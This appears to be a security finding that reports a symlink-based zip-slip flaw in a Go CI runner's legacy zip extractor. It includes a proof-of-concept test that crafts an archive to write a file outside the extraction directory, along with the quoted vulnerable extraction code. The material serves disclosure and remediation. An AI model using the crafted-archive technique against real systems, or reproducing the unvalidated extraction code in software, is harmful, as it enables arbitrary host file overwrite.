### Title
Zip extraction allows symlink-based path traversal (zip-slip via symlink redirection) - ([File: helpers/archives/zip_extract.go])

### Summary
The legacy zip extractor's `extractZipSymlinkEntry` creates a filesystem symlink using an attacker-controlled link target read directly from the zip entry's content, with no validation that the target stays inside the extraction directory. A subsequent zip entry with the same `file.Name` is then written via `extractZipFileEntry`/`os.OpenFile`, which follows the symlink and writes to the attacker-chosen target path.

### Finding Description
`extractZipFile` (helpers/archives/zip_extract.go:61-83) dispatches based on `file.Mode() & os.ModeType`. For `os.ModeSymlink` entries it calls `extractZipSymlinkEntry`, which reads the entry's file content as the symlink target and calls `os.Symlink(string(data), file.Name)` directly (lines 22-39), with no check that `string(data)` is a relative path confined to the extraction root, and no check that `file.Name` itself is confined to the extraction root either.

For regular files, `extractZipFileEntry` (lines 41-59) does `_ = os.Remove(file.Name)` followed by `os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, ...)`. Critically, `os.Remove` on a path that is itself a symlink removes the symlink, not its target — but if an *earlier* symlink entry created `a/b -> ../../outside` and a *later* entry targets a path like `a/b/evil` (a path that traverses through the symlink component), `os.OpenFile`/`os.MkdirAll` (used for parent directories, line 63) will follow the symlink component and write outside the extraction directory. The whole `helpers/archives` package (`path_check_helper.go`) only checks for `.git` directory entries (`errorIfGitDirectory`) — there is no zip-slip check (no `filepath.Clean`/`filepath.IsLocal` validation on `file.Name`) and no restriction on symlink targets.

This code path is reachable whenever the legacy zip extractor is used, which is the default runtime configuration: `commands/helpers/archiver.go` only registers the safer `fastzip` extractor when `FF_USE_FASTZIP` is enabled; by default (`FF_USE_FASTZIP=false`, per `helpers/featureflags/flags.go`), `ziplegacy.NewExtractor` (commands/helpers/archive/ziplegacy/zip_legacy_extractor.go) is used, which calls straight into `archives.ExtractZipArchive` → `extractZipFile` → `extractZipSymlinkEntry`. Cache/artifact archives are attacker-influenceable content (a pipeline author controls what gets zipped into cache/artifacts, and these are later extracted by Runner on cache-restore/artifact-download for that or a later job).

### Impact Explanation
An attacker who controls the contents of a zip archive that Runner extracts (e.g., a cache or artifact archive built by a job under their control, later restored by Runner) can craft a symlink entry pointing outside the extraction sandbox followed by a data entry with a path that traverses through that symlink, causing Runner to write attacker-controlled content to an arbitrary filesystem location writable by the Runner process. This can overwrite files on the host/build environment outside the intended job workspace — matching the scoped impact of host file overwrite via symlink escape.

### Likelihood Explanation
Preconditions are narrow but realistic: the legacy zip extractor must be active (the default, since `FF_USE_FASTZIP` defaults to `false`), and the attacker needs to control zip archive content that Runner will extract (cache/artifact archives are directly attacker-authored via job scripts). No special privileges are required beyond authoring a pipeline. The exploit is deterministic and repeatable given the ordered entries in a crafted zip.

### Recommendation
In `extractZipSymlinkEntry` and `extractZipFile`, validate that `file.Name` (after `filepath.Clean`) does not escape the extraction root and is not an absolute path, and validate that the symlink target (`string(data)`) resolves to a path within the extraction root before calling `os.Symlink`. Additionally, before writing regular file entries, verify (e.g., via `os.Lstat` on each path component or by resolving the final path with `filepath.EvalSymlinks` relative to the extraction root) that no path component is a symlink that would redirect the write outside the sandbox — mirroring the protections used in `fastzip`'s extractor.

### Proof of Concept
```go
// helpers/archives/zip_extract_symlink_escape_test.go
package archives

import (
	"archive/zip"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestExtractZipSymlinkEscape(t *testing.T) {
	tmpOutside := t.TempDir()
	sentinel := filepath.Join(tmpOutside, "evil")

	extractDir := t.TempDir()
	origWd, _ := os.Getwd()
	require.NoError(t, os.Chdir(extractDir))
	defer os.Chdir(origWd)

	archivePath := filepath.Join(extractDir, "poc.zip")
	f, err := os.Create(archivePath)
	require.NoError(t, err)
	zw := zip.NewWriter(f)

	// Entry 1: symlink "link" -> outside directory (relative traversal)
	relTarget, _ := filepath.Rel(extractDir, tmpOutside)
	linkHeader := &zip.FileHeader{Name: "link"}
	linkHeader.SetMode(os.ModeSymlink | 0o777)
	w, err := zw.CreateHeader(linkHeader)
	require.NoError(t, err)
	_, err = w.Write([]byte(relTarget))
	require.NoError(t, err)

	// Entry 2: file written through the symlink -> "link/evil"
	fileHeader := &zip.FileHeader{Name: "link/evil"}
	fileHeader.SetMode(0o644)
	w2, err := zw.CreateHeader(fileHeader)
	require.NoError(t, err)
	_, err = w2.Write([]byte("pwned"))
	require.NoError(t, err)

	require.NoError(t, zw.Close())
	require.NoError(t, f.Close())
	defer os.Remove(archivePath)

	err = ExtractZipFile(archivePath)
	require.NoError(t, err)

	// Assert the sentinel file OUTSIDE the extraction dir was NOT created/modified
	_, statErr := os.Stat(sentinel)
	assert.True(t, os.IsNotExist(statErr), "symlink escape allowed write outside extraction dir: %s", sentinel)
}
```
Expected (current) behavior: the test fails because `sentinel` (`tmpOutside/evil`) is created with content `"pwned"`, proving the symlink escape. func extractZipSymlinkEntry(file *zip.File) (err error) {
```go
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}
```

```go
func extractZipFileEntry(file *zip.File) (err error) {
	var out *os.File
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	// Remove file before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	out, err = os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode().Perm())
	if err != nil {
		return err
	}
	defer func() { _ = out.Close() }()
	_, err = io.Copy(out, in)

	return
}
```

```go
func extractZipFile(file *zip.File) (err error) {
	// Create all parents to extract the file
	err = os.MkdirAll(filepath.Dir(file.Name), 0o777)
	if err != nil {
		return err
	}

	switch file.Mode() & os.ModeType {
	case os.ModeDir:
		err = extractZipDirectoryEntry(file)

	case os.ModeSymlink:
		err = extractZipSymlinkEntry(file)

	case os.ModeNamedPipe, os.ModeSocket, os.ModeDevice:
		// Ignore files of these types
		logrus.Warningf("File ignored: %q", file.Name)

	default:
		err = extractZipFileEntry(file)
	}
	return
}
```

```go
func isPathAGitDirectory(path string) bool {
	parts := strings.Split(filepath.Clean(path), string(filepath.Separator))
	if len(parts) > 0 && parts[0] == ".git" {
		return true
	}
	return false
}

func errorIfGitDirectory(path string) *os.PathError {
	if !isPathAGitDirectory(path) {
		return nil
	}

	return &os.PathError{
		Op:   ".git inside of archive",
		Path: path,
		Err:  errors.New("trying to archive or extract .git path"),
	}
}
```
